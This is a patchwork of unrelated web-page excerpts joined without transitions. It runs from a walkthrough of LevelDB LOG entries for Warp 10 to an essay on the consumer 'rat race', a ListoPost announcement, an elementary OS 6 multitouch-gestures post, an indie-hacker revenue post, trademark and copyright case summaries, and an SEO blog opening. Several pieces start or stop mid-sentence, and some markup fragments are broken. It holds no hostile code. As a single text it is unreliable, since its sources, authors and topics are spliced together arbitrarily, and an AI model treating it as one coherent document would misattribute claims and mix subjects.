<p>When reading data, the set of SST files to access is retrieved from the data in the MANIFEST, and the required files are opened and the data to read is reconciled from those files and the current memtable, managing overwrites and deletions.</p>



<p>All operations performed on the SST, log and MANIFEST files are logged in the <code>LOG</code> file.</p>



<h2>Understanding the LevelDB LOG entries</h2>



<p>The <code>LOG</code> file in your <code>leveldb</code> directory is a rich source of information to understand how your Warp 10 instance is behaving.</p>



<h3>LevelDB start up</h3>



<p>When the LevelDB database is opened, the current <code>.log</code> file is recovered and converted to an SST file, a new <code>.log</code> file is initiated and a new <code>MANIFEST</code> file is created with updated information about all the known <code>.sst</code> files. While scanning the SST files upon startup, LevelDB may decide to remove unreferenced files.</p>



<p>When opening a LevelDB database with the following files:</p>



<pre><code>CURRENT
LOG
MANIFEST-000839
.... plenty of .sst files ....
000837.sst
000841.log
000842.sst</code></pre>



<p>The following entries will appear in the new <code>LOG</code> file (the previous LOG file will be renamed <code>LOG.old</code>):</p>



<pre><code>2019/09/05-09:54:01.235885 7000045d0000 Recovering log #841
2019/09/05-09:54:01.237443 7000045d0000 Delete type=0 #841
2019/09/05-09:54:01.237509 7000045d0000 Delete type=3 #839</code></pre>



<p>The first line says the log file was recovered, since it was empty in our case, it did not lead to the creation of a new SST file. Then the log file (<code>type=0</code>) was deleted and the old MANIFEST (<code>type=3</code>) was removed. The <code>leveldb</code> now contains the following files:</p>



<pre><code>000837.sst
000842.sst
LOG.old
CURRENT
000844.log
MANIFEST-000843
LOG</code></pre>



<p>You can see a fresh log file (with id 844) and a fresh MANIFEST (with id 843). The <code>CURRENT</code> file contains the full name of the MANIFEST file (<code>MANIFEST-000843</code>).</p>



<figure></figure>



<h3><code>log</code> rotations</h3>



<p>As you push data, the <code>.log</code> file fills up and will reach a point when LevelDB will decide to rotate it. When this happens, the following LOG entries will appear:</p>



<pre><code>2019/09/05-10:00:07.976574 7000043c7000 Level-0 table #846: started
2019/09/05-10:00:08.022811 7000043c7000 Level-0 table #846: 3264502 bytes OK
2019/09/05-10:00:08.024013 7000043c7000 Delete type=0 #844</code></pre>



<p>The first line indicates that a new SST file (with id 846) was initiated at level 0. The second line, 50ms later, states that 3,264,502 bytes were transferred to it from the log file being rotated. Then the third line indicates that the log file that was just rotated was deleted. The new log file was created just before the creation of the new SST file and thus has the id 845. The files in the <code>leveldb</code> are therefore:</p>



<pre><code>000842.sst
LOG.old
CURRENT
000846.sst
000845.log
LOG
MANIFEST-000843</code></pre>



<h3>Compactions</h3>



<p>After writing data for a while, SST files at level 0 will reach a threshold that will trigger a compaction. LevelDB will then select files at level 0 and level 1 and will merge them, creating new SST files at level 1.</p>



<p>The LOG entries for compaction look like this:</p>



<pre><code>2019/09/05-10:12:29.932735 7000043c7000 Compacting 3@0 + 5@1 files
2019/09/05-10:12:29.935664 7000043c7000 Generated table #855: 1 keys, 299 bytes
2019/09/05-10:12:29.953873 7000043c7000 Level-0 table #858: started
2019/09/05-10:12:29.971680 7000043c7000 Level-0 table #858: 1836221 bytes OK
2019/09/05-10:12:29.973850 7000043c7000 Delete type=0 #853
2019/09/05-10:12:30.004067 7000043c7000 Generated table #856: 181829 keys, 2120146 bytes
2019/09/05-10:12:30.063737 7000043c7000 Generated table #859: 181828 keys, 2120137 bytes
2019/09/05-10:12:30.117959 7000043c7000 Generated table #860: 181825 keys, 2120084 bytes
2019/09/05-10:12:30.137805 7000043c7000 Generated table #861: 58498 keys, 682097 bytes
2019/09/05-10:12:30.238360 7000043c7000 Generated table #862: 13 keys, 153 bytes
2019/09/05-10:12:30.238379 7000043c7000 Compacted 3@0 + 5@1 files =&gt; 7042916 bytes
2019/09/05-10:12:30.238592 7000043c7000 compacted to: files[ 2 8 56 69 0 0 0 ]</code></pre>



<p>The compaction will involve 3 files at level 0 (<code>3@0</code>) and 5 files at level 1 (<code>5@1</code>). The result of this compaction is a set of 5 files (<code>856</code>, <code>859</code>, <code>860</code>, <code>861</code> and <code>862</code>). You can see the size of each of those files and the number of key/value pairs they contain. This gives you an idea of the footprint of each datapoint. In our example file <code>856</code> contains  181,829 entries for a total of 2,120,146 bytes, so a footprint of 11.66 bytes per datapoint, that's 11.66 bytes for the id of the series, the timestamp, and the value.</p>



<p>The last two LOG entries summarize the compaction, giving you the total size of the generated SST files and the current number of files at the various levels (2 at level 0, 8 at level 1, 56 at level 2, <em>etc)</em>.</p>



<h3>Housekeeping</h3>



<p>If we continue pushing data to our Warp 10 instance, we can see new types of LOG entries, such as:</p>



<pre><code>2019/09/05-10:21:04.142429 7000043c7000 Level-0 table #864: started
2019/09/05-10:21:04.172528 7000043c7000 Level-0 table #864: 3264502 bytes OK
2019/09/05-10:21:04.174262 7000043c7000 Delete type=2 #745
2019/09/05-10:21:04.175685 7000043c7000 Delete type=2 #746
2019/09/05-10:21:04.176116 7000043c7000 Delete type=2 #747
2019/09/05-10:21:04.176521 7000043c7000 Delete type=2 #748
2019/09/05-10:21:04.176642 7000043c7000 Delete type=2 #780
2019/09/05-10:21:04.177114 7000043c7000 Delete type=2 #850
2019/09/05-10:21:04.177535 7000043c7000 Delete type=2 #852
2019/09/05-10:21:04.177843 7000043c7000 Delete type=2 #854
2019/09/05-10:21:04.178211 7000043c7000 Delete type=0 #857
2019/09/05-10:21:04.178511 7000043c7000 Moved #856 to level-2 2120146 bytes OK: files[ 2 8 57 69 0 0 0 ]
2019/09/05-10:21:04.178773 7000043c7000 Moved #859 to level-2 2120137 bytes OK: files[ 2 7 58 69 0 0 0 ]</code></pre>



<p>The <code>Delete type=2</code> entries inform about the cleaning of the SST files merged in a previous compaction.</p>



<p>The last two entries indicate that some SST files were moved as-is from level 1 to level 2 to rebalance the number of files at the various levels.</p>



<h2>Takeaway</h2>



<p>You should now understand how LevelDB works and you should be able to read the <code>LOG</code> file to find valuable information such as the average size of datapoints in SST files.</p>



<p>As an LSM trees backend, LevelDB handles deletions by writing tombstones to the log file, this means that deletions will only reclaim space when the SST files containing the tombstones are merged at the deepest level. </p>



<p>To overcome this, <a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> offers a commercial extension to Warp 10 to reclaim space immediately by intelligently suppressing SST files. Please contact our <a href="mailto:sales@senx.io" target="_blank" rel="noreferrer noopener">sales team</a> if you would be interested in this offering. Note that this extension is used by default in <a href="https://blog.senx.io/introducing-the-warp-10-sandbox/" target="_blank" rel="noreferrer noopener">the sandbox</a> and in our hosted Warp 10 instances.</p>

<p><em>The worst thing about our modern culture is the growing ignorance towards what’s really valuable in the world. From an early age, we join a long-distance rat race where the competition is measured not by who we are, but by what we own. Therefore, the desire for material possessions and attention from our peers become our chief goals. Survival, it seems to us, is based on how well we portray our qualities to the outside world – even if we don’t necessarily possess them.</em></p>



<p>Living a normal life according to our society, even if we don’t always admit it, is tightly connected to the acquisition of funds. One of the most talked-about traits promoted by institutions regardless of our location is the value of money. Of course, this is not directly mentioned by the media outlets or by our neighbors, it’s beautifully camouflaged by what money can buy.</p>



<p>As soon as we understand that all breathing humans worship money and stuff, the sooner we start to desire <a href="https://durmonski.com/psychology/why-we-hate-cheap-things/" target="_blank" aria-label="luxury items (opens in a new tab)" rel="noreferrer noopener">luxury items</a>. Not so much because they are useful, but because these fancy goods make us look like we are more.</p>



<p>And so it happens, that directly after we come into being, these values and principles get embedded in our brains and later influence our decisions. We want better and more beautiful things. But most of all, we want others to <em>see</em> that we actually own these marvelous objects.</p>



<p>This game of competitive signaling has become unbearable only recently. When the number of available choices vastly increased and the way we communicate with others (compare ourselves with them) significantly improved.</p>



<p>In this post, we’ll look at why we’re stuck in this competitive rat race. Why the desire to acquire new things is never tamed and what we can do about it. </p>



<p>By bringing awareness to the problems, I want to liberate more people from the destructive components of this never-ending race to the bottom.</p>







<h2>What is Rat Race Life?</h2>



<p>A modern rat race categorizes as an endless pursuit – often quite exhausting – where you earn small rewards by conspicuous behavior reinforced by acquiring more financial gains or possessions – or both. However, these gains never feel satisfactory enough. As new things constantly appear on the horizon – new products and new competitors who are also part of the race – the only way we can stay ahead of the curve is by constantly investing resources in this rivalry.</p>



<p>In a way, participating in this vain competition is required. After all, our survival is tightly related to the tools, the resources we personally own, plus the relationship we form with others. That’s why we stay devoted to the race – because deep inside, our genes are focused on survival and replication.</p>



<p>That’s the general concept of the modern rat race. Or in the words of Tyler Durden, the protagonist in the masterpiece Fight Club, “We buy things we don’t need with money we don’t have to impress people we don’t like.” But to really grasp the reasons we commit to a life of struggle over resources, we need to go a step deeper.</p>



<p>Let’s unpack the modern rat race ideology further…</p>







<h2>Why and How The Rat Race Was Formed?</h2>



<p>The first reference of the expression rat race was used in the 1930s during aviation training. As stated by Popular Science magazine in 1941, ‘A rat race is … a simple game of “follow the leader.'”<span id="easy-footnote-1-12306"></span><span><a href="#easy-footnote-bottom-1-12306" title="&amp;#8220;<a aria-label=&quot;Rat-race (opens in a new tab)&quot; rel=&quot;noreferrer noopener nofollow&quot; href=&quot;https://www.etymonline.com/search?q=rat+race&quot; target=&quot;_blank&quot; class=&quot;ek-link&quot;>Rat-race</a>&amp;#8220;. Online Etymology Dictionary."><sup>1</sup></a></span> Or in other words, the expression meant that the trainee fighter pilot had to copy all the actions performed by the senior pilot. </p>



<p>A decade later, the term changed its original meaning.</p>



<p>Nowadays, the expression is more closely related to how we live our lives day by day. We don’t simply “follow the leaders”, we compete with them. We want to be like them. To have what they have and to eventually beat them in the game of resources.</p>



<p>This fierce rivalry for wealth is inspired and fueled by three main motivators:</p>







<h3>1. The Genes Want to Survive</h3>



<p>We, our actions, are highly influenced by the desires of the microorganisms that form our bodies – our genes. According to Richard Dawkins, the author of <a aria-label="The Selfish Gene (opens in a new tab)" rel="noreferrer noopener" href="https://durmonski.com/book-summaries/the-selfish-gene/" target="_blank">The Selfish Gene</a>, “the main goal of the body is to propagate copies of the genes which ride inside it.” To achieve this feat, the body is required to strictly follow two commands: survive and replicate.</p>



<p>There is nothing more important for the genes. We live to live another day and to copy ourselves.</p>







<h3>2. Universal Recognition of Money</h3>



<p>Different religions exist in different countries but we are all loyal to one and only lord – the money lord. Or as Yuval Noah Harari writes in his bestseller, <a aria-label="Sapiens (opens in a new tab)" rel="noreferrer noopener" href="https://durmonski.com/book-summaries/sapiens-a-brief-history-of-humankind/" target="_blank">Sapiens</a>, “Money is the most universal and most efficient system of mutual trust ever devised.”</p>



<p>During the years of our existence, we form a love-hate relationship with money. On the one hand, we hate it when we see people who are willing to do whatever it takes to earn more and to gain more power. We have movies, literature, songs, and words that mock the aggressive pursuit of more cash.</p>



<p>On the other hand, however, we adequately recognize the need for this resource. Since money is the currency that can literally save our lives from misery and decay, we have no other choice but to obey some sort of rules to gain more of this finite resource. Even so, while it surely exists, our desire to get more money is usually not directly expressed. Throughout our lives, we learn to successfully decoy our desire for wealth. That’s actually why money is a taboo subject.</p>







<h3>3. Technological Advancements</h3>



<p>High-tech gizmos and the internet greatly exceeded our expectations. These two innovations enabled us to connected like no other species.</p>



<p>At first, we used the Wi-Fi connection to send emails and to communicate better. Now, we use it to showcase our self-worth and to advertise our qualities to the whole world. All of this, done with the underlying desire to feel more desirable by others.</p>







<hr>



<p>The three above-mentioned notes can be portrayed in the following way:</p>

We show it by the stuff we obtain and the things we say/do.</figcaption></figure>







<p>Our inner eagerness to survive forces us to obtain money. And cash, supports our existence. But for most, the comfort of holding large chunks of capital in the bank is not enough. We also want to be seen as wealthy.</p>



<p>After all, just owning money is not enough to increase your chances of survival – meeting new friends that will help you along the way and also potential mates. That’s why, we’re also eager to parade with what we have.&nbsp;&nbsp;</p>



<p>Just as the peacock spreads its feathers to show its impeccable genes, we, through our actions and the things we acquire, show the world our features hoping that they’ll pick us. This our way of saying to others, “Look at me, my qualities and traits are so good that I can afford to spend $50,000 on a car. You should want to hang around with me.”</p>



<p>Our possessions are an advertisement, a way of showing off. They reinforce the image we desire to portray. And by going around and talking about ourselves, we want to signal to others – in a non-verbal way in most of the cases – why we are a worthy choice.</p>



<p>This is also called competitive signaling.</p>







<h2>What is Competitive Signaling?</h2>



<p>The way you spend your money can say a lot about how you want to position yourself in modern competition. </p>



<p>If you think carefully about everything before you buy it, and you’re not interested in high-end goods, your income is either average or you’re careless of what others think of you. In contrast, if you focus primarily on obtaining premium goods, you’re probably either rich or you want to be perceived as rich.<span id="easy-footnote-2-12306"></span><span><a href="#easy-footnote-bottom-2-12306" title="The last two are completely different things."><sup>2</sup></a></span></p>



<p>Thorstein Veblen, an American economist and sociologist, argued that the demand for luxury goods is driven largely by a single social motive: “flaunting one’s wealth.”</p>



<p>For example, Nissan is a car. It’s an average, not-flashy, automobile that will help you go from point A to point B, faster. Porsche, on the other hand, is an art museum on wheels. It can also get you from point A to point B, but while driving around town in this beast on wheels you radiate a completely different vibe. You present yourself as a modern, high-paid individual with taste and ambition. Figuratively speaking, the amount of cash that each of them has in the bank – the person owning a Nissan and the person owning a Porsche – can be exactly the same. On the outside though, they appear quite different.&nbsp;&nbsp;</p>



<p>The more interesting thing to consider, if say the individuals in the above example really do have the same amount of cash stashed, is how they approach buying domestic goods – a set of dishes, blankets, or say cleaning products. Since these goods are not to be seen by others, they both, even the person owning a sports car, will most probably end up getting the same cheap things.<span id="easy-footnote-3-12306"></span><span><a href="#easy-footnote-bottom-3-12306" title="This, of course, says a lot more things about their personality. For example, you can have an average income and still get a flashy car. But then, the things that are not visible by others will probably be average to compensate. Conversely, if you&amp;#8217;re <em>really</em> rich, you&amp;#8217;ll probably buy luxury domestic goods, too."><sup>3</sup></a></span></p>



<p>With this, we can conclude that the available products on the market are a mix of personal value and signaling value.</p>



<p>The car you have is simultaneously a way to move faster in the city and also a representation of your hierarchy in the world. Each product on the market, nowadays, comes with these qualities.</p>



<p>And if we can put this in a graph, it will look something like this:</p>

<p>At some point, certain products become a beacon of your self-worth.

The Internet as we know it today is filled with walled gardens and data silos locking in all their users' data. When we publish online, our goal is often to reach the largest audience possible. So, why should we continue to submit our important content to restrictive platforms?
</p>

<p>
This is why we have been building ListoPost: a new platform to openly share content and data.  
</p>

<p>
<strong>Open content is shareable.</strong><br>

To guarantee that content submitted on our platform has the greatest reach possible we license the content by default under the <a href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike</a> license. Using open licenses has been proven by other popular websites like StackOverflow and Unsplash. Since we encourage all submitted posts to be shared far beyond our site, we also don't want to generate revenue via display ads and ask for a fee for distributing content.
</p>

<p>
<strong>Open content is accessible.</strong><br>

Our plan is to build a robust API to access all of this valuable openly licensed content. If you are interested in our API, please email us developers@listopost.com to tell us about your needs.

December 2, 2020 | https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>One of the most hotly requested features for years has been to have multi-touch gestures in elementary OS, and with 6.0 I’m excited to say that we will deliver. Like the <a href="https://blog.elementary.io/dark-style-progress/">dark style preference</a>, delivering a great multi-touch experience is a little more complicated than it seems on the surface. There have been some 3rd party tools to detect touchpad gestures and then trigger actions after-the-fact, but it wasn’t until recently that we’ve had the technical ability to provide smooth, responsive animations that track 1:1 with your finger movement across a touchpad or touch screen.</p>

<h2 id="window-manager-gestures">Window Manager Gestures</h2>

<p>We’ve had the great pleasure of working with <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">José Expósito</a>, the author of Touchégg, on our window manager gestures. In elementary OS 6, we use Touchégg Daemon behind the scenes to capture input events and communicate them to Gala, our window manager.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/multitasking.gif" alt="Multitasking View"></p>
  <figcaption>1:1 multi-touch gestures used for Multitasking View</figcaption>
</figure>

<p>At the moment, we’re reviewing two proposals: one for the multitasking view and another for switching workspaces directly. Both of these use 1:1 responsive, finger-tracking gestures that can be peeked or canceled at any time. When special animations aren’t available in the window manager, such as when tiling, we fall back to animations built in to Touchégg.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/workspaces.gif" alt="Switching workspaces"></p>
  <figcaption>1:1 multi-touch gestures used for switching workspaces</figcaption>
</figure>

<p>We’re still discussing exactly what the default configuration should be, but work is already underway on System Settings so that you can choose whichever gestures feel most comfortable for you—or choose none at all.</p>

<figure>
  <p><img alt="Gesture Settings" src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/settings.png" width="990" height="686"></p>
  <figcaption>Gesture configuration in System Settings → Mouse &amp; Touchpad</figcaption>
</figure>

<p>If you’d like to support José’s work on multi-touch gestures for elementary OS 6—and other Linux-based operating systems—you can do so with as little as $2/mo on <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">GitHub Sponsors</a>.</p>



<h2 id="app-gestures">App Gestures</h2>

<p>In order to make gestures work globally, previous solutions have opted to emulate keyboard shortcuts after a gesture was completed. This is effective, but animations—if they’re provided at all—don’t feel connected to users’ input. Instead, in elementary OS 6 we’re making use of Handy, a library originally developed for <a rel="nofollow noopener noreferrer" target="_blank" href="https://puri.sm/">Purism</a> and their Open Source phone platform. This means that each app and desktop component must be updated to support gestures individually, which is ultimately a lot more work but a vastly superior experience.</p>

<h3 id="paging">Paging</h3>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/appcenter.gif" alt="AppCenter Screenshots"></p>
  <figcaption>Paging screenshots in AppCenter</figcaption>
</figure>

<p>In elementary OS 5, we used Handy to add gestures for switching pages to the applications menu and during onboarding. So far, in elementary OS 6 this has been extended to the Date &amp; Time indicator to switch months in the calendar view and to AppCenter to switch between screenshots. This makes use of the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Carousel.html">Handy Carousel</a> widget which also provides a smooth transition between page indicator dots when needed. Our plan is to provide gestures any time pages are used and we’re already tracking issues for Calendar and more.</p>

<h3 id="navigation">Navigation</h3>

<p>Another place we’ve implemented gestures is while navigating between panes or views. This is using the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Deck.html">Handy Deck</a> widget which contains a concept of next and previous views and shows views in a neat stack. Swipe-to-go-back is now implemented in elementary OS 6 in Feedback, in the Installer and Initial Setup views for configuring locale variants, and in Systems Settings → Keyboard when adding new layouts. Gestures are also now available natively in WebkitGtk and therefore Epiphany also provides swipe navigation for both back and forward.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/keyboard-layouts.gif" alt="Keyboard Layouts"></p>
  <figcaption>Navigating when adding keyboard layouts in System Settings → Keyboard</figcaption>
</figure>

<p>Some more complex navigation situations are in progress such as when navigating between views in System Settings itself and in AppCenter. There are also open issues for navigating in Files and Photos, but development hasn’t yet started there. Working with Handy Deck in these situations has exposed some inefficiencies in the way navigation was implemented previously so not only are we implementing a new feature, but the underlying code is being made more robust and optimized.</p>

<h3 id="other">Other</h3>

<p>We’re also looking into other uses for gestures as popularized in mobile operating systems, such as swipe to dismiss. In elementary OS 6, you can now dismiss notification bubbles from the desktop with a swipe, and remove them from the notifications indicator by swiping in either direction as well. We haven’t implemented swipe-to-dismiss in other types of lists yet, but we’re open to suggestions! You can follow along with our <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/orgs/elementary/projects/61">progress and plans on GitHub</a>, as well as file feature requests.</p>

<figure>
  <p><img alt="Notification Center" src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/notification-center.gif" width="399" height="672"></p>
  <figcaption>Notification bubbles being swiped away in the new Notification Center</figcaption>
</figure>

<p>A quick note about pinch-to-zoom and rotate, at the moment we don’t yet have a way to implement these more complex gestures. We may have to wait until we can provide GTK4 in a Flatpak or for elementary OS 7 before it becomes possible to provide gestures for transforms.</p>

<p>Lastly, I just wanted to say thank you to <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/alexm_gnome">Alexander Mikhaylenko</a> for being available for questions and feature requests as we implement Handy in our apps. He’s been an essential resource and very open to improving Handy for our use cases.</p>

<h2 id="get-early-access">Get Early Access</h2>

<p>If you’re excited by what you read here and want to get your hands on the developer preview of elementary OS 6, you can! GitHub sponsors at the $10/mo or above tier get access to our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">daily builds server</a> where you can test the latest and greatest experimental builds, including builds for Pinebook Pro. Subscribing helps us fund the development of elementary OS and brings us that much closer to delivering the final product.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content-pane"><div><p>The founding stories of big tech companies get people pumped on the idea of starting their own thing, from <a href="https://en.wikipedia.org/wiki/Software_as_a_service" title="https://en.wikipedia.org/wiki/Software_as_a_service">SaaS</a> products to <a href="https://trends.vc/trends-0036-paid-newsletters/" title="https://trends.vc/trends-0036-paid-newsletters/">paid newsletters</a> . The concept sounds awesome. Build something, it picks up speed, and swiftly grows into a multi-million dollar company. It’s a crazy success story, you’re set for life! Silicon Valley has no shortage of examples to be gawked at: AirBnb, Amazon, Dropbox, Facebook, Google, Netflix, etc which all exploded in the last 15 years.</p><p>Once you start trying to create it, though, odds are your idea is not a runaway success. There are ideas where the problem is so important, so valuable, so sticky to businesses that you can give them the worst pile of garbage in the world and they will fork over bajillions of dollars. If you are in that camp and pulling in cash is as easy as drinking water, stop reading, this isn’t for you.</p><p>Getting users is really freakin’ hard. Getting customers who will pay you to use your idea is even harder. When you’re struggling to acquire new users, it’s frustrating to look at the big tech companies and realize they have millions, if not billions of users. How are you ever supposed to convince that many people your idea is awesome, but you’re struggling to get just 10.</p><p>Divorce yourself from the notion you need to match those giant tech companies. How many customers does it actually take to support one person? Is it a million? 100,000? 10,000? Try 99.</p><p>I’ll back it up with the math in a second, but for now, think about how awesome this is. 99 is an achievable number. You know more than 99 people on a first-name basis. You’ve waited in lines longer than 99 people! But, I’m just some guy on the internet saying this. Heck, for all you know I’m not actually a person, this is just a <a href="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog" title="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog">pile of words GPT-3 thinks sound nice together</a>. So let’s break it down and see how you only need 99 people’s support to make a drastic change to your life.</p><h2 id="assumptions--definitions">Assumptions &amp; Definitions</h2><p>Assumptions first. I’ll be calculating this for one person, but it should scale up if you have a team. When it comes to making money, I see several inflection points of Monthly Recurring Revenue (MRR).</p><ol><li>$1</li><li><strong>Beer Money (BM) MRR</strong> - $100</li><li><strong>Rent MRR</strong> - $1,000</li><li><strong>College Grad (CG) MRR</strong> - $5,000</li><li><strong>Magical (MA) MRR</strong> - $10,000</li></ol><p>Stage 1, you’ve made your first dollar. Somebody out there thinks your idea doesn’t suck. Celebrate this, it’s a big achievement! One caveat for your dollar, it does <strong>NOT</strong> count if it came from your mom.</p><p>At <strong>Beer Money MRR</strong>, you are making $100 every month. You have cracked the 3 digit barrier, and can buy a lot of beer/wine/cheese/whatever without feeling too guilty about your budget.</p><p><strong>Rent MRR</strong> is where things get good, this is $1,000 a month. In some places this isn’t enough to live on by itself, but it is life-changing money no matter where you are. It likely covers all or a good chunk of your rent, hence the name. If you are poo-pooing me for saying $1k MRR is a big deal, you should get your head out of your ass and look at the rest of the world outside your bubble.</p><p><strong>College Grad MRR</strong> is $5k a month. This is $60k a year, which is near the average for a college graduate in the U.S. and more importantly, the math is easy when it divides nice. No calculators needed to read this article!</p><p><strong>Magical MRR</strong> is the last stop for this train. This is $10k a month, which is a <strong>TON</strong> of money. You’ll have taxes and expenses and junk, but to have people paying you $120k a year to use your idea must feel fantastic. I call it magical because $10k gets thrown around a lot in indie hacker articles &amp; community as a magic number to reach.</p><h2 id="show-me-the-money">Show Me the Money!</h2><p>Ok we have some definitions locked in, now we’ll go through 2 product examples: <strong>Product A</strong> at $10 and <strong>Product B</strong> at $50, again keeping the math easy. This could be a <a href="https://en.wikipedia.org/wiki/Software_as_a_service" title="https://en.wikipedia.org/wiki/Software_as_a_service">SaaS</a> charging monthly, an eBook, a course, paid newsletter, whatever. We’re looking per month, so the specifics of what is pulling in the dough don’t matter for this article. I took a couple liberties to knock off 1 sale here and there to keep it to 2 or 3 digits, because seeing those inflection points is what inspires me personally. Only 2 digits of people? I can do that.</p><p><strong>Product A, $10:</strong></p><p><strong>BM =</strong> 10 people</p><p><strong>Rent =</strong> 99 people is all it takes</p><p><strong>CG =</strong> 500 people</p><p><strong>MA =</strong> 999 people a month need to feel like your idea is worth it</p><hr><p><strong>Product B, $50:</strong></p><p><strong>BM =</strong> 2 people</p><p><strong>Rent =</strong> 20 people is all it takes</p><p><strong>CG =</strong> 99 people</p><p><strong>MA =</strong> 200 people a month need to feel like your idea is worth it</p><p>You can reach a life changing amount of money from your side hustle, and you need to convince less than 1,000 people that what you do/create/build is worth it. It’s often thrown around that you need <a href="https://kk.org/thetechnium/1000-true-fans/" title="https://kk.org/thetechnium/1000-true-fans/">1,000 true fans</a>, or as the math would suggest, just 99. Out of <a href="https://www.worldometers.info/world-population/" title="https://www.worldometers.info/world-population/">7.8 billion</a> humans, you only need 99 in your corner to break the threshold to <strong>Rent MRR</strong>.

It unveiled a new short-form online interview series called 'TIME100 Talks' which featured online interviews with journalists, talents and thought leaders. As the videos became popular, Time magazine began to branch out with this brand, establishing Time Talks for dedicated topics like health. Accordingly, they applied to have the trademark 'TIME100 Talks' registered with the United States Patents and Trademarks Office (USPTO). As of the date of this writing, the status of this application is still 'pending'.</span></p><p><span data-preserver-spaces="true">This success then attracted the ire of the New York Times, whose holding company has a registered trademark for the words' Times Talks'. The company, arguably most famous for its crosswords or angering the President, decided then to commence proceedings against Time magazine for trademark infringement.&nbsp;</span></p><p><span data-preserver-spaces="true">The main arguments that the courts will need to decide is whether TIME100 Talks is an infringement of 'Time Talks' or an extension of the trademark, 'TIME100'.&nbsp;</span></p><p><span data-preserver-spaces="true">It is a surprise that it has taken this long for the companies to meet regarding trademark infringement as the New York Times has been around since 1851 and Time magazine was first published in 1923. Since the commencement of both publications, they have both relied heavily on their marketing of the word 'time'.&nbsp;</span></p><p><span data-preserver-spaces="true">But what will happen if two established companies with consistent branding and registered trademarks go toe-to-toe in the boxing ring of justice? Well, most likely, not too much, as there is too much at stake. Generic usage of a trademark is the killer of all brands and one of the biggest threats to a company's intellectual property. Since 1788, the word Times has been used in relation to newspapers and the reporting of the news. It is one of the default placeholder names for a newspaper or publication with the location of the publication often preceding the word. In fact, Times began being used by newspapers in England before making it to New York, so it may be argued that it was always in common usage.&nbsp;</span></p><p><span data-preserver-spaces="true">Accordingly, if this were ever to make it to trial, both parties are at risk of having their registered trademarks cancelled if the court determines that it has fallen into generic usage. Going the way of the 'flip-phone', originally a Motorola trademark, when a trademark loses its distinguishing nature, it can often lead to an abandonment of the product/brand itself. Although this is admittedly, unlikely given the circumstances surrounding this matter, it is always worth considering.&nbsp;</span></p><p><span data-preserver-spaces="true">With this case, we will see soon whether the court determines that there is enough evidence to proceed to trial and whether each parties' trademarks are at risk.&nbsp;</span></p></div></div>

OFF-BRAND&nbsp; How a high-fashion brand and an ice cream shop have come to blows over intellectual property In the various industries that are out there, not too many are as different as fashion and ice cream. One is involved in providing happiness, comfort and everything nice in this world and that other provides a sharp reminder that maybe that extra scoop of ice cream was too much. But suffice to say, a rift between the two industries is not something that you would expect to find.&nbsp; But as hype culture and the obsessive fandom on the internet have grown, the industries have been growing closer and closer together. But sadly, not in the way you think, we are still a few years off wearable ice cream. Instead, there is now a good chance that your local ice creamery sells merchandise. Less impressive, for sure. But this has become a staple for restaurants with even just a modicum of goodwill attached to their name and why not? If customers are willing to pay an extra $50 so that people will

&nbsp; Green Eggs and Hamm How a crotch shot of John Hamm and Dr Seuss have sparked the most intense debate on fair use dealing in copyright in the last ten years.&nbsp; In 2013, John Hamm was in full swing, sipping cocktails and filming the wildly successful&nbsp; Mad Men&nbsp; however in years to come he may be remembered for something much more different. One uneventful day, John Hamm was photographed going commando and, thus changed how we see intellectual property rights on the internet forever.&nbsp; Like all paparazzi photos, it was promptly uploaded to the internet and licenced for use.  Unbeknownst to the photographer, the image was then used in an article by the Huffington Post, titled "25 Things You Wish You Hadn't Learned In 2013 And Must Forget In 2014." The writer of the piece turned the photo into a humourous GIF with the intention of mocking people who would want to see the picture and satirising the idea that it was news at all.&nbsp; The photographer later registered the photo's

A recent case in the United States District Court of Massachusetts has seen a woman whose house was used as a film set for adult videos without her knowledge be awarded damages… but not for what you think. In&nbsp; Bassett v Jensen,&nbsp; Ms Bassett, the owner of the property, signed an agreement with a renter to lease her Martha's Vineyard property for seven months for the sole use of Mr Spafford and his family. Spafford had moved to Martha's Vineyard to work as a photographer and cameraman for an adult film director.  Throughout the lease, Ms Bassett claims that 21 different videos were filmed at her property. Following the end of the Lease, Ms Bassett had to stop renting out the property as there was significant damage caused to the building and later due to the publicity that the property was used in filming the videos. Ms Bassett then argued that not only did the video showcase her property but they had infringed her copyright on numerous of her self-made artworks which were hanging

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Two weeks ago I created a brand new blog for <a href="https://spreadtheworld.net/">SpreadTheWorld</a>. I wanted to start some SEO efforts that will generate traffic to my product. I know SEO is a long term game, I thought that maybe I can leverage the content through distribution.</p><h2 id="the-content">The Content</h2><p>To kickstart my blog I wanted some good content that provides value to the readers. I don’t bother much about keywords, for now, I just wanted something valuable that will help both SEO&nbsp;&amp;&nbsp;marketing.
My first post was about one of my favorite topics:&nbsp;How to use Reddit as an IndieHacker.
